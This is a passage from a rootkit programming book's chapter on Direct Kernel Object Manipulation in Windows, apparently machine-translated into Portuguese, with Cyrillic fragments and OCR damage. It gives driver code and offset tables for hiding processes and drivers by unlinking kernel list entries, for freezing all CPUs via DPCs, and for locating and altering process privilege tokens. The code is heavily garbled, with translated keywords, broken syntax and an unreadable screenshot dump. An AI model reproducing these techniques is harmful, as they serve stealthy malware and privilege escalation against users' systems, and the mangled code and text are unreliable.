Nome RootkitCallback (Listagem 13.4). 
A função rootkitcallback recebe principalmente o local atual
IRP Stack: Graças a isso, podemos acessar 
Boofors Entrada/saída do dispositivo e outras informações importantes.Depois 
Esta função está envolvida no processamento do IOCTL recebido do usual
Tel Process. 
Listagem 13.4.Controle de dispositivo IRP MJ 
Ntstatus rootkitcallback 
(Em pdevice_object pdevice, no PIRP PLRP) 
( 
Pio_stack_location irp_stack; 
Pvoid ​​inputBuffer;// buffer de entrada 
Pvoid ​​outputBuffer;// boofer de saída 
Ulong inp_length;// comprimento do buffer de entrada 
Ulong out_length;// comprimento boofer de saída 
Ulong ioctl;// código de entrada/saída de controle 
Status ntstatus; 
status = pirp-> iostatus.information; 
pirp-> iostatus.information = status_success; 
Irp_stack = ioGetCurentLrpStackLocation (PLRP); 
// recebemos sinais de buffers de entrada/saída 
268

pagina: 268

Capítulo 13. Tecnologia DKOM 
InputBuffer = pirp-> AssociatedIrp.systemBuffer; 
Inp_length = irp_stack-> parameters.devicelocontrol. 
InputBufferLength; 
OutputBuffer = pirp-> associado! 
Out_length = irp_stack-> parameters.devicelocontrol. 
OutputBufferLength; 
// Obtenha o código de controle 
ioctl = irp_stack-> parameters.devicelocontrol.iocontrolCode; 
Switch (irp_stack-> majorfunction) { 
Case irp_mj_create: break; 
Case irp_mj_close: break; 
Case irp_mj_device_control: 
Switch (ioctl) { 
Case ioctl_drv_init: 
// Adicione o código de inicialização do Rutkit 
Quebrar; 
Case ioctl_drv_ver: 
// retorna informações sobre a versão de Rutkin 
Quebrar; 
} 
Quebrar; 
} 
OclomEteraQuest (PLRP, io_no_increment); 
Status de retorno; 
13.4.Hiding Processos usando DKOM 
Todos os sistemas operacionais armazenam tudo o que é necessário para o seu trabalho 
Informações (lista de processos, conexões de rede, etc.) no operacional
Memória Noah na forma de objetos ou estruturas.Quando o processo do usuário 
Avalia essas informações, digamos, uma lista de processos, threads ou unidades
Crenças de dispositivos, o sistema operacional transfere para ele certos objetos 
(estruturas).Por sua vez, o processo do usuário processa isso 
Informações de acordo com a solicitação do usuário e fornece a ele. 
Como modificamos o processo de usuário transmitido em
Formação em capítulos anteriores?Nós interceptamos uma das funções da API 
- NT* (se trabalhamos com privilégios de usuário) ou ZW* 
(se trabalhamos no nível do núcleo).Então lançamos o original 
A função recebeu o resultado, por exemplo, uma lista de processos.O resultado é Ana
era lise, e os elementos que precisamos foram excluídos dele, por exemplo, necessidade
os nomes dos processos para nós.A diferença no tempo do processador, em regra, 
escrito para o processo de inatividade (inativo). 
269

pagina: 269

Rootkits
A tecnologia DKOM oferece não interceptar a função da API, mas para mudar
essas estruturas (objetos) do núcleo que são usados ​​por essas funções - em
Nosso caso é uma lista de processos.Então as próprias funções ZW* serão devolvidas
para as funções do nt* o resultado de que precisamos.
Os sistemas operacionais da família NT (NT/2000/XP/2003) armazenam uma lista
processos na forma de uma lista dupla anular de estruturas de eProcess.Cada
Esta estrutura descreve um processo separado e, por sua vez, contém
Estrutura list_entry, cujos membros, flink e piscar, indicam depois
Blowing e processos anteriores na lista, respectivamente.É para a lista
As estruturas de eProcess são abordadas pela ZwQuerySystemlnf Ormation.
convidado pelo programa TaskMgr.exe e outros Provações recebendo
Lista de processos.
Para ocultar o processo, você precisa obter um ponteiro para a estrutura do eProcess
O processo de interesse para nós e para isso, a primeira coisa a encontrar na memória
A lista de eprocess.O endereço da lista varia para várias versões
Windows, mas, felizmente, há uma maneira universal de chegar a isso
Xia.A função PSGetCurrentProcess retorna o ponteiro para a estrutura
EProcess do processo atual e, como a lista é duas
Role -o em busca do processo desejado, começando em qualquer elemento.
Função
PSGetCurrentProcess
-
é um apelido
Para
funções
LogetCurrentProcess.Se você é dizassemble esta função, então você vê
criança três instruções:
MOV EAX, FS: 0x00000124
MOV EAX, [EAX + 0x44]
Ret
O que faz este código?Windows chama a unidade de controle do núcleo (KRPCB,
Bloco de controle do processador do kernel).Este bloco é único e
Lozhen no espaço de endereço do núcleo em 0xffffff120.Primeiro insp
A custódia da função coloca na EAC algo localizado no registro FS para
deslocamento 0x124 desde o início do registro.Acontece que este é um ponteiro para o bloco
EthRead é uma estrutura que descreve o fluxo atual.Este bloco tem
Poiner (apcstate) para o eProcess atual.O caminho de KPRCB para o nosso
O eProcess é mostrado na FIG.13.3.
Há outra maneira de encontrar um processo - de acordo com seu PID (identificador de processo).PID
Está localizado de acordo com um certo deslocamento na unidade de eProcess.Conhecendo o deslocamento
PID, podemos calcular o endereço EPROCESS.É verdade, o deslocamento depende de
versões do sistema operacional.A tabela a seguir mostra deslocamentos
PID e ponteiro para o próximo processo de flink referente ao eProcess.
270

pagina: 270

Capítulo 13. Tecnologia DKOM 
KRPCB 
*CurrentThread 
"Nextthread 
'Idlethread 
Ethread 
Kthrem) 
A p c s c a t e 
Eprocess 
Liste ehthy 
Eprocess 
Lista ehtry 
Eprocess 
Lista ehtry 
Arroz.13.3.O caminho do KPRCB para o eProcess atual 
Tabela 13.1.Deslocamento PID e Flink em relação ao eProcess 
Versão do Windows 
Windows NT 4.0 
Windows 2000 
Windows XP (também SP2) 
Windows 2003 
PID 
0x94 
0x9c 
0x84 
0x84 
Flink 
0x98 
Oxao 
0x88 
0x88 
Escreveremos uma função retornando o endereço do bloco de eProcess do processo por seu 
PID.As funções precisam transmitir o processo PID e, na saída, obtemos o endereço 
sua unidade de eProcess. 
Listagem 13.5.Procure o processo PID 
DWord getEprocessbypid (int pid) 
DWord eprocess = 0x0;// Endereço Eprocess 
int curpid = 0;// pid do processo atual 
int startpid = 0;// PID inicial 
Plist_entry Plist;// ponteiro para a estrutura de lim_entry 
int 
if (pid == 0) retornar PID; 
// Obtenha o endereço do eprocess atual 
Eprocess = (dword) psgetCurrentProcess; 
// pidoffset é um deslocamento PID, dependendo da versão do Windows 
Startpid = *( 
(int*) 
(Eprocess 
+ 
Pidoffset)); 
271

pagina: 271

Rootkits 
Curpid = startpid; 
Enquanto (1) 
{ 
if (pid == 
Curpid) // 
Nós 
Encontrou o processo necessário 
Retornar eprocess;// 
Devolver 
endereço 
Caso contrário, se ((contagem> = 
1) && (startpid == curpid)) 
Retornar 0x000000; 
Outro 
< 
// Flinkoffset - 
Esse 
Deslocamento de flinque 
Plist = (list_entry)*(Eprocess+Flinkoffset); 
Eprocess = (dword) plist-> flink; 
Eprocess = eprocess - flinkoffset; 
Curpid = *( 
(int*) 
(Eprocess 
+ 
Pidoffset))) 
; 
Contagem ++; 
} 
Observe que os ponteiros de flinque e piscar não indicam o começo 
a estrutura apropriada do eprocess e em seu membro list_entry, para 
calcular o ponteiro no eprocess deve ser retirado do endereço recebido 
Deslocamento Flinkoffset. 
O nome do processo é apresentado na estrutura da linha de 16 bytes eprocess 
Os primeiros dezesseis caracteres do nome são considerados únicos.Se 
Dois processos foram lançados, os primeiros dezesseis símbolos do nome dos quais
Timov, teremos dois processos com o mesmo nome.Portanto, não um nome 
O processo e apenas o PID identifica claramente o processo.Mas com 
É mais conveniente trabalhar em um nome, porque o sistema operacional é atribuído pelo PID 
Os processos iniciais não estão em ordem, mas aleatoriamente. 
Que deslocamento na estrutura do eProcess é o nome do processo?Esse 
Depende da versão do Windows.Este deslocamento pode ser calculado para a corrente 
Processo "MyProcess" (listando 13.6). 
Listagem 13.6.Calcular o deslocamento do processo do processo na estrutura do eProcess 
Ulong GetProcessNameoff () 
Ulong Offset; 
Peprocess pcurproc; 
Pcurproc = psgetCurrentProcess; 
para 
(Offseet = 
0; 
Offseet <Page_Size;Desvio 
+ 
+ 
) 
{ 
if (! strncmp ("myProcess", (pchar) curproc + offseet, 
Strlen ("MyProcess")) 
272

pagina: 272

Capítulo 13. Tecnologia DKOM 
Retornar 
Desvio; 
} 
retornar 
(ULONG) 0; 
O que precisa ser substituído em vez do nome "MyProcess"?Sabe -se que a função 
Drivers driverentry carregados usando a API do SC Manager 
Realizado no contexto do processo do sistema ("sistema").Então se 
Ligue para a função GetProcessNameoffset da função Drivertry, então 
O nome do processo atual será o sistema.Conhecendo o valor do deslocamento,
getprocessnamoof gotado getprocessnamoof, você pode usá -lo em funções 
GetEprocessby* em vez de pidoffset para encontrar um processo pelo seu nome 
Em vez de pid. 
Acontece que agora podemos ocultar o processo.Para isso, você só precisa 
Substitua os ponteiros de flink do processo anterior e piscar do próximo 
O processo para que o processo oculto “caia” da lista (Fig. 13.4). 
Eprocess 
KProcess 
Listjehtry 
Flink 
Piscar 
1 
Eprocess 
KProcess 
LISTEHTRY 
Flink 
Piscar 
! 
Eprocess 
KProcess 
LISTEHTRY 
Flink 
Piscar 
processo oculto 
Arroz.13.4.Escondendo o processo 
Listagem 13.7. 
Exclusão da lista de processos com o famoso PID 
Ntstatus hideprocessbypid (int pid) 
( 
DWORD EPROCESS = 
0; 
Plist_entry Plist, PlistNext, PlistPrev; 
Eprocess = getEprocessbypid (PID); 
if (eprocess = 0x000000) 
Retornar status_invalid_parameter; 
Plist = (ListenRty*) (Eprocess + Flinkoffset); 
PlistNext = Plist-> Flink; 
PlistPrev = Plist-> Blink; 
// muda os ponteiros flink e piscarem do anterior e do próximo 
processos 
PlistNext-> Blink = PlistPrev; 
273

pagina: 273

Rootkits 
PlistPrev-> Flink = PlistNext; 
// flink e piscar sinais do processo oculto 
// Instale no mesmo processo 
Plist-> Blink = (list_entry *) & 
(Plist-> f'link); 
Plist-> Flink- (list_entry *) & 
(Plist-> Flink); 
Retornar status_success; 
} 
Preste atenção às últimas linhas do código: você deve 
Instale sinais de flink e piscar de piscar o processo oculto por conta própria
Duas estrutura list_entry.Se você não fizer isso, então com completo
O Instituto de Pesquisa desse processo corre o risco de ver a tela azul da morte. 
Por que isso está acontecendo?Após a conclusão do processo, o sistema deve ser
Chave -o da lista substituindo os sinais de flink e piscar de seus vizinhos 
Novos significados.Quando o vizinho do nosso processo termina, o sistema 
não pode modificar nossos sinais, porque nosso processo 
Ela "não vê";que eles ainda indicam permitidos 
Áreas de memória, precisamos cuidar de nós mesmos.Nós fizemos isso, a boca
Noviv sinais de si mesmos. 
13.5.Drivers de conexão de dispositivos 
A ocultação de drivers de dispositivos é tão importante para Rutkin quanto esconder 
processos.Afinal, geralmente a raiz é vendida na forma de um driver de dispositivo, por
Ele precisa esconder isso principalmente ele mesmo. 
Existem vários utilitários no Windows que exibem a lista de drivers -
Por exemplo, o Windows Manager ou o utilitário drivers.exe. 
A composição do kit de recursos do Microsoft.Todos eles solicitam uma lista de carregados 
Módulos de núcleo (drivers), causando o ZwQueryStymlnf Ormation 
com o parâmetro System_inf0rmati0n_class = 11. No capítulo 6, aprendemos 
Pegue esta função.É verdade que estávamos interessados ​​na aula de informações
5, em resposta à qual a função deslocou a lista de processos. 
Agora falaremos sobre como modificar a lista de drivers. 
Ele, como uma lista de processos, é organizado na forma de uma lista dupla. 
Os elementos desta lista são M0DULE_ENTRY STRUTURAS: 
Typedef struct _module_nentry { 
List_entry module_list_entry; 
DWORD UNKNOWNL [14]; 
274

pagina: 274

Capítulo 13. Tecnologia DKOM 
Base dWord; 
DWord driver_start; 
DWord desconhecido2; 
Unicode_string driver_path; 
Unicode_string driver_name; 
//... 
} Module_entry, *pmodule_entry; 
A primeira coisa que precisamos fazer é encontrar o início da lista de drivers.Como 
E no caso dos processos, a pesquisa deve ser iniciada com o driver atual.Sobre 
Sua estrutura module_entry é indicada por um campo minado 
Driver_Object Structures, localizado de acordo com o deslocamento de 0x14 desde o início 
Driver_Object Structures.Código da função retornando o módulo de endereço_ 
A entrada do driver atual é fornecida na listagem 13.8. 
Listagem 13.8.Obtendo um ponteiro para o elemento atual da lista de drivers 
DWORD GetCurmodulenty (em 
Pdriver_object pdriver) 
{ 
Pmodule_entry Current; 
if (pdriver == 
Nulo) retornar 
0; 
Atual = *((pmodule_entry *) ((dWord) driver + 0x14)); 
if (atual == 
Nulo) retornar 
0; 
// registra o endereço recebido na variável global 
// tipo pmodule_entry, que será necessário em 
Outras funções 
LoadEdModuleList = 
Atual; 
Retornar corrente; 
A estrutura de driver_object contém a estrutura já conhecida por nós 
List_entry, sinais dos quais permitem que você se mova ao longo da lista em 
qualquer direção.Assim que encontrarmos o elemento de lista desejado 
(por exemplo, pelo nome de driver_name), poderemos esconder a centena da mesma maneira 
Como fizemos isso com processos (listando 13.9). 
Listagem 13.9.Ocultação do motorista por nome 
HidemoduleByName 
( 
Pmodule_nentry c u r r e n t = carregamentoModulost; 
Enquanto 
((Pmodule_entry) Current-> le.mod.flink 
! = ModaList 
( 
275

pagina: 275

Rootkits 
if ((current-> desconhecido 1 = 0x000000) && 
(Current-> driver_path.length! = 0) 
{ 
Se rtlcompareunicodestring (pnametohide, 
& (Atual)-> driver_name), false) == 0) 
{ 
*((Pword) current-> le_mod.blink) = 
(DWord) current-> le_mod.flink; 
Current-> le_mod.flink-> Blink = Current-> le_mod.blink; 
Quebrar; 
Module_entry 
List_ehtry 
Flink 
" 
Piscar 
Objeto de driver 
P modentry 
1 
Module_entry 
List_ehtry 
Flink 
Piscar 
" - 
1 
Module_entry 
ListJ3htrx 
Flink 
Piscar 
Arroz.13.5.Lista 
Motoristas 
Lembre -se, ao modificar uma lista de processos, modificamos isso
O mesmo processo do processo de eProcess que teve que ser oculto?No caso de CO 
A lista de motoristas não é necessária para isso, porque os motoristas geralmente são 
Eles são carregados e descarregados não com tanta frequência quanto os processos.Geralmente motoristas 
carregado ao carregar o sistema e descarregado no final do trabalho 
com o sistema.No processo, o sistema raramente descarrega os drivers. 
O código acima funcionará em um nível passivo (passivo_ 
Nível), isso requer a função para trabalhar com as rastreias Unicode. 
13.6.Problemas de sincronização 
"Walk" na lista de processos é muito mais perigoso do que na lista de motoristas. 
O fato é que o rutkit pode ser descarregado na área de natação e durante o tempo 
Sua estadia lá pode ser criada processos adicionais ou 
concluído já executado. 
276

pagina: 276

Capítulo 13. Tecnologia DKOM 
Como regra, o programa bloqueia o acesso ao RE usado em conjunto
Sursu com uma bandeira de semáforo ou exclusivo de exclusivo) 
- Variedades de um semáforo com dois estados: conjunto (1, objeto de seu
Boden) ou descartado (0, o objeto está ocupado).Para controlar o acesso à lista 
Processos e lista de módulos são semáforos PspactiveProcessMutex e 
PSLoadedModulerSource, respectivamente.Esses semáforos não são um exportador
Eles são essenciais, então você terá que encontrá -los você mesmo.Poder ir 
"Na testa" - digitalize a memória na busca de uma determinada amostra.Este método 
Simples, mas tem uma desvantagem significativa: quantas versões do Windows, tanto 
e amostras. 
Seguiremos para o outro lado: transferiremos todos os processadores do sistema para o nível 
Interrupções Dispatch_level.Nesse nível, uma modificação de listas de
Cessos e motoristas estão seguros.Lembre -se de que no nível 
Despacho_level não pode funcionar com memória descarregada: uma tentativa de
Atera para isso levará ao aparecimento de uma tela de morte azul. 
O mecanismo que vamos considerar é chamado 
Procedimentos de chamada (DPC, chamada de procedimento diferido).Uso dos motoristas 
Esse mecanismo, quando a interrupção recebida requer processamento complexo, 
o que não é econômico para se apresentar em um nível mais alto.Solicitação DPC 
leva ao desafio oposto de uma certa função do motorista, que 
será realizado no nível Dispatch_level.Isso reduz o tempo para
Interrupção segurando outros dispositivos no sistema. 
A chamada DPC é descrita pelo objeto DPC (definido em NTDDK. H).Para o in
O cilindro do objeto DPC é a função k e l n i t i a l i z e d p c c, que 
É necessário transmitir o ponteiro para a função a ser adiado. 
Teremos essa função Raisecpu, que aumenta o contador do processador, 
Transferido para o nível de despacho_level. 
O objeto DPC inicializado deve ser colocado na fila.Para cada 
O processador corresponde a uma linha DPC.Se você não atribuir um objeto 
DPC do processador em que sua função de retorno de chamada será executada, de
O poder da função KesetTargetProcessDPC, então será definido em
A radiação do processador atual.O número do processador atual pode ser obtido, 
Chamando a função KecurrentProcessornumber e o número de processadores 
O sistema contém a variável Kenumberprocessors. 
Resta apenas dizer isso para obter o nível atual de nível 
Interrupções são um sistema de chamada kegetcurrentlrql e para instalação 
Novo significado - 
Keraiselrql.Agora você pode considerar a função 
Raiseallcpu, transferindo todos os processadores para interromper os níveis 
Dispatch_level (Listagem 13.10). 
277

pagina: 277

Rootkits 
Listagem 13.10.Transferência do sistema para o nível de despacho_level 
Pkdpc raiseallcpu () 
f 
Ntstatus s; 
Ulong Curcpu; 
Cchar a; 
Pkdpc dpc, t_dpc; 
if (kegetCurrentlrql ()! 
= Despacho_level) retornar nulo; 
// Inicializa as variáveis ​​globais zeros. 
// allcpudispatch = 1, se todos os processadores forem traduzidos 
// para o nível de despacho; 
// numcpudispatch - o número de processadores que já estão trabalhando 
// no nível de despacho 
Intertravamento e (Sallcpudispatch, 0); 
Intertravamento e (snumcpudispatch, 0); 
T_pdc = (pkdpc) exallocatepool (nonpagedpool, 
Kenumberprocessors * sizeof (kdpc); 
if (t_dpc == null) retorna nulo; 
Curcpu = kegetCurrentprocessornumber (); 
dpc = t_dpc; 
para (
a 
= 0;A <KenumberProcessors;a ++, *t_dpc ++) 
{ 
se (
A! = Curcpu) 
{ 
// inicialize o objeto 
DPC 
Kelnitializedpc (t_dpc, raisecpu, nulo); 
KesetTargetprocessDPC (T_DPC, A) 
; 
KelnsertQuedpc (T DPC, 
Nulo nulo); 
// Estamos aguardando o número de processadores no nível de despacho 
// não é igual ao número do resto (o atual menos é atual) 
// processadores 
While (interlockedcomparexchange (snumcpudispatch), 
Kenumberprocessors-1, 
KenumberProcessors-1)! 
{ 
ASM 
Nop; 
} 
Retornar DPC; 
// status_success; 
} 
Void* rasecpu (em pkdpc 
DPC, 
Em pvoid adteredContext, 
No Pvoid ​​Systemargumentl, no Pvoid ​​Systemargument2) 
{ 
Intertravamento (snumcpudispatch); 
278

pagina: 278

Capítulo 13. Tecnologia DKOM 
Enquanto (! InterlockedComparexChange (Sallcpudispatch, 1, 1)) 
{ 
ASM NOP; 
} 
Intertravamento (snumcpudispatch); 
} 
Depois que todos os processadores são transferidos para o nível de despacho, 
Nosso Rutkin será capaz de modificar as listas de processos e drivers.POS
A modificação dessas listas, devemos libertar a memória alocada 
Para todos os objetos DPC.Isso pode ser feito usando a função de liberação
Esources (listando 13.11). 
Listagem 13.11.Remoção de objetos DPC 
NTSTATUS ReleaseEResources (PVOid PDC) 
{ 
Intertravamento (Sallcpudispatch) 
; 
While (intertravamento compareexchange 
{ 
ASM NOP; 
} 
if (pdc! = null) 
{ 
Exfreepool (DPC); 
dpc = nulo; 
} 
Retornar status_success; 
) 
Usando o material fornecido nas seções anteriores deste capítulo, você 
Você pode ocultar os processos de que precisa.Mas a ocultação em si é usada
Lezno, se o processo não tiver os privilégios necessários.Na sequência 
O ponto que falaremos sobre como capturar privilégios adicionais. 
13.7.Obtendo privilégios adicionais 
O que são privilégios, todo mundo sabe.Privilégios Determine o que pode 
Faça nosso processo, mas o que é impossível.Quanto mais eles são, mais o processo tem 
oportunidades. 
13.7.1.Privilegias Token 
No Windows, cada processo tem seu próprio token de privilégio (de outra forma chamado
Meu marcador de acesso, token de acesso).Além disso, seu próprio token pode 
279

pagina: 279

Rootkits 
ter cada fluxo no contexto de um processo, mas geralmente todos os fluxos 
Use o token do processo.Neste parágrafo, só falaremos sobre traição
Instituto de Pesquisa de Token do processo.No entanto, se necessário, refaça o exemplo do código para 
O trabalho com fluxos é fácil. 
Para modificar o token do processo, a API Win32 fornece o seguinte 
funções: 
• OpenProcessToken; 
• AjustTokenPrivileges; 
• Grupos de ajuste. 
Todas essas funções exigem que o processo de prova tenha estabelecido
Lena p
SOBRE
eu
N
SOBRE
M
SOBRE
H
E
Eu sou token_adjust_privileges e token_adjust_groups. 
Mas, como usamos o DKOM, esses poderes simplesmente não são 
Precisar.Podemos modificar os privilégios do processo e sem uso
Funções da API - diretamente. 
A linha inferior é o seguinte: Encontramos o endereço da estrutura do Eprocess Pro
Cess, cujos poderes queremos mudar (parágrafo 13.4).Depois disso, tudo 
O que resta para fazer é encontrar um sinal de privilégios nessa estrutura e 
Mude.Deslocamento do token em relação ao início da estrutura do eProcess, 
Como sempre, depende da versão do sistema operacional.A próxima tabela 
Isso o ajudará a determinar (Tabela 13.2). 
Tabela 13.2.Deslocamento do token de privilégio 
sistema operacional 
Windows nt 
Windows 2000 
Windows XP (incluindo XP SP2) 
Windows 2003 
Viés 
0x108 
0x12c 
0xc8 
0xc8 
Na estrutura do eProcess, o token de privilégios é representado pela seguinte estrutura: 
Typedef struct _ex_fast_ref { 
União { 
Objeto pvoid; 
ULONG REFCNT: 
3; 
Valor ulong; 
) EU 
) Ex_fast_ref, *pex_fast_ref; 
Os últimos bits do endereço do token de privilégio são sempre iguais a 0. Portanto 
Você pode obtê -lo com um desafio da seguinte função: 
280

pagina: 280

Capítulo 13. Tecnologia DKOM
DWORD GetPrivToken (DWORD EPROCESS)
{.
Dword token;
ASM {
Mov eax, eprocess;
Mov eax, deslocamento;// O deslocamento do token depende da versão do sistema operacional
mov eax, [eax];
Mov eax, 0xfffffff8;// perdendo os últimos bits
Mov Token, Eax;
}
Token de retorno;
}
13.7.2.Mudando privilégios
Mudar o token de privilégios será mais difícil do que encontrá -lo.
O token tem uma estrutura muito complexa que consiste em partes de constante
e tamanho alternado.O menos previsível, é claro, a variável
Parte: ele contém todo o SID (ID de segurança) que pode usar
a escritura do processo, ou seja, o usuário Sid, em nome do qual é lançado sobre
O cess e o SID de todos os grupos que incluem esse usuário.É claro que
O número de SID será diferente não apenas para diferentes versões do Windows,
mas também para diferentes usuários.A parte variável também contém uma lista
Direitos específicos que o processo possui e a duração desta lista.
A Tabela 13.3 mostra os deslocamentos de alguns campos importantes em relação
Mas o início da estrutura ex_fast_ref.
Tabela 13.3.Deslocamento de partes de privilégios de tokens de comprimento variável
OS
NT 4.0
Ganhe 2000
Winxpspl
Win XP SP2
WIN 2003
Auth
EU IA
0x18
0x18
0x18
0x18
0x18
Contador
Sid
0x30
Ohzs
0x40
0x4c
0x4c
Lista
Sid
0x48
0x58
0x5c
0x68
0x68
Contador
privilégios
0x34
0x44
0x48
0x54
0x54
Lista
privilégios
0x50
0x64
0x68
0x74
0x74
Você pode visualizar a lista de privilégios do processo usando o programa
Processo
Explorador
(h t p: / / w w w. s y s i n t e r n a l s. c o m / f i l e s /
ProcessExploreRont.zip).Para fazer isso, escolha o interesse para você
Processo, no seu menu de contexto, selecione o comando Propriedades e na janela
As propriedades vão para a guia de segurança (Fig. 13.7).
281

pagina: 281

Rootkits 
\..s y 
: £ i l e opções 
Visualizar 
Grocesso 
Ffnd 
Lidar 
Usuários 
: Ajuda' • 
M u 
Processo 
-
. 
BELEZA; 
EJ 
Tipo 
/ 
Área de Trabalho 
Diretório 
Diretório 
Diretor 
Evento 
Evento 
Evento 
Evento 
Evento 
Evento 
Fife 
Arquivo 
Arquivo 
Arquivo 
F, L, " 
П 
M* "ш ы \ '-№:-
• - eu 
DPCs 
Sistema 
O s s s.EXE 
3 c s r s.EXE 
В 
Winldgon.exe 
Boservices.exe 
Bosvchost.exe 
^ 
Agentsvt.exe 
P^svchost.exe 
O S V C H 0 S t.EXE 
I 3 S V C H 0 S t.EXE 
O s p 0 0 l s v.EXE 
1 nome 
\ Padrão 
\Janelas 
\ 8 ASEN amedubjects 
\ KnowDlls 
* 
№ 
Pid) 
n / D 
4 
684 
756 
780 
828 
992 
1228 
1036 
1144 
1160 
1512 
Ч Asen amedo bjectsvuset Env 
\ BasenamedObjects 
CPU I Descrição '' 
Chamadas de procedimento diferido 
Windows NT Session Manager 
Processo de tempo de execução do servidor do cliente 
- 
0:95 
Притожutos с с и и и и и и ир п п nt 
Processo genérico para й Processo para serviços Win32 
Microsoft Agent Server 
Processo de host genérico para serviços Win32 
Processo de host genérico para serviços Win32 
;. •; ..: 
Processo de host genérico para serviços Win32 
App de subsistema de Spooler 
eu 
Evento de configuração do perfil usei 
\ ShellReadyEvenl 
Sb 
ASEN amedubiectsvhpiugeiecte Vent 
SBASENEDGBJETSSMIXERCALFBACK 
SBASEMEDGBJETSSHAFDWAREMIXERCALLBACK 
SB ASEN amedobiect3 \ Crypt32Logoffe Vent 
Cawindowswinsxssx86j4icwsoft.windows.common -... 
C: \ Documentos e SettngSxall UsersSpadomnu 
C: \ Documentos e Stttngs \ Dents \ Pa6044 & cho 
Cadocuments e SettingSSD 
f-lbnn? Sn 
Enisslocal Seuingss & Pplicati ... 
Uso da CPU: 7,62% 
JCOMMIT CARGA: 34,68% Processos: 25 [ 
J Compan! 
Microsoft. 
Microsoft. 
(Concnopa, 
Kopnopa. 
Microsoft. 
Microsoft 
Microsoft. 
Microsoft. 
Microsoft. 
Microsoft. 
.Jkujj^& j., «.. «<J 
1 
-
. 
<щ 
-
_ eu 
.: 
Р.13.6.Process Explorer в ã 
Ям 
imagem 
.Tópicos • 
Desempenho: 
Ponto 
: I: ••: Gráfico Perfom-Ariice 
Segurança 
j 
Ambiente 
Serviços 
, K balança 
Usuário: NTAuthority \ System 
:: Grupo -: J% 
;, ;; 
; •• д, в?; .. -;; v 
Ииычычадииниitivamente 
Proprietário 
Nt аитн0в1т \ прошешшиpel проÉI 
Obrigatório 
С 
Obrigatório 
Privilégio 
Mar Seassig^rimaiytokenPrivilege 
S eauditpf ivilege 
S ebackupprivitege 
S echangen otifyp » 
vtlege 
S EcreatePageftiePri Vilege 
SECFEATEPEIMANENTPUVTLEGE 
Secf 
Eatet Okenpriviege 
Sedebugpnvttege 
J Bandeiras 
Desabilitado 
Padrão ativado 
Desabilitado 
Padrão ativado 
Padrão ativado 
Padrão ativado 
Desabilitado 
Padrão ativado 
eu 
1 
J 
d 
Р.13.7.Приuna 
процutos 
Serviços.exe 
Эээ о э э э э э э э э э ы ы ы ы ы ы ы ы ы ы ы ы ы ы ы ы ы ы
сотреть, 
какиutos 
приuna
гии процutos você 
(Habilitado), а каиutos - 
(Desabilitado).Как ы иите, 
большинство 
приuna 
O о ponto. 
Mus.
иииииииntas
A н нH рз зо то тооа.Дэто
го нмжжно н нtens 
сиисо ença 
акивferir 
выключен­
. 
13.4 перutos 
приuna 
иоо sentido 
. 
282

pagina: 282

Capítulo 13. Tecnologia DKOM 
Tabela 13.4.Os principais privilégios dos processos 
Privilégio 
Setcbprivilege 
SemachineAcCountPrivilege 
SelncreaseQuotaprivilege 
Sebackuppprivilege 
SERESTOREPRIVILEGE 
SechangenotifyPrivilege 
Sesystemtimeprivilege 
SecreateTokenPrivilege 
SecreepermanentPrivilege 
SegreatePageFilePrivilege 
Encontro 
Permite que o processo acesse os recursos de qualquer 
outro processo.Como regra, este privilégio
Dê serviços de autenticação de baixo nível 
Permite que o usuário adicione uma estação de trabalho 
(computador) em um determinado domínio 
Permite que você instale cotas de memória para este processo
SA.Geralmente é usado para configuração fina. 
Em mãos hábeis também podem ser usadas para lançar 
Ataques do DOS (negação de serviço, recusa para manutenção) 
Permite que o usuário faça um backup
Sistema.Este privilégio é usado apenas. 
Quando o processo causa a função da API, pretendido
Reserve para backup 
Permite restaurar arquivos e catálogos da reserva
uma cópia 
Permite que o usuário entre em contato com o usuário. 
que não tem acesso ao catálogo pai;Mais de uma vez
Decide visualizar o índice do subcatalog.Napp
Medidas, o usuário tem acesso apenas ao catálogo com: \ 
Relatórios \ Company \ Denis, mas não para relatar catálogos e 
Empresa.Se essa opavigação for estabelecida, usando
Tel será capaz de trabalhar com o subtalogue Denis 
Permite que o usuário altere o tempo do sistema. 
Este privilégio não é obrigado a mudar o temporário 
zonas ou exibição do tempo do sistema 
Permite que o processo crie um marcador de acesso com ajuda
ntcreatetekoken ou outra função da API 
Permite que você crie um objeto permanente no despachante 
objetos.A autoridade é muito útil para componentes 
núcleos que precisam expandir seu próprio espaço
Seus nomes 
Permite que você crie um arquivo giratório, além de mudar 
Seu tamanho

pagina: 283

Rootkits
Tabela 13.4.Os principais processos dos processos (continuação)
Provelegia
Sedebugprivilege
ViewableLelegationPrivilege
SeremoteshutdownPrivilege
Privilégio de Seshutdown
Seauditprivilege
SelncreaseBaserIortyTyPrivil
Ege
Seloaddriverprivilege
SelockMemoryPrivilege
SesecurityPrivilege
Sesystemenvironmentprivilege
SemanageVolumePrivilege
Seprofilesingleprocessprivil
Ege
SessystemProfilePrivilege
SeundockPrivilege
Encontro
Permite que você se conecte a qualquer processo, o que não é necessário
Dino para sua depuração
Permite que o usuário altere as configurações de delegiro
Vania para o ActiveDirectory
Permite o usuário remotamente
Termine o trabalho
sistemas
Permite que o usuário termine a operação do sistema
Permite o acesso ao Journal of Security, incluindo
Criação de novas entradas no diário
Permite que o usuário altere a prioridade do processo
Permite que o usuário carregue e descarregue a unidade
Dispositivos RPR
Permite que o processo armazene dados no físico
Ti, que impede a descarga desses dados em um arquivo em
Embalando em um disco rígido.Usando este privilégio
pode afetar negativamente o desempenho
sistemas
Permite que o usuário indique opções para acesso a de
Recursos sensíveis - arquivos, objetos do ActineRectory,
Chaves de registro
Permite a modificação das variáveis ​​do sistema do distrito
A API (software) ou na janela Propriedades
sistemas (manualmente)
Permissões para não administradores ou benefícios remotos
Vatel para gerenciar volumes (discos lógicos)
Permite avaliar o desempenho do processo
Permite avaliar o desempenho do sistema
Permite que o computador desative da doca (de
A potência do menu Iniciar -> Desligue o PC.Relevante
Para usuários de computadores portáteis, conectando
para a doca
284

pagina: 284

Capítulo 13. Tecnologia DKOM 
Tabela 13.4.Os principais processos dos processos (continuação) 
Provelegia 
SeassignPrimaryTokenPrivil 
comida 
Sesyncagentprivilege 
Setrakewnershiprivilege 
Encontro 
Permite que o processo dos pais mude o piso do token
NOMA da subsidiária 
Permite a sincronização dos dados 
Catálogos. 
Necessário para o uso do LDAP (diretório leve 
Protocolo de acesso) 
Permite alterações para o proprietário dos arquivos ou outros volumes
Explorescências 
13.7.3.K a trabalha com privilégios rutkit fu 
Agora começaremos a explorar o popular Rutkit Fu hoje.O original 
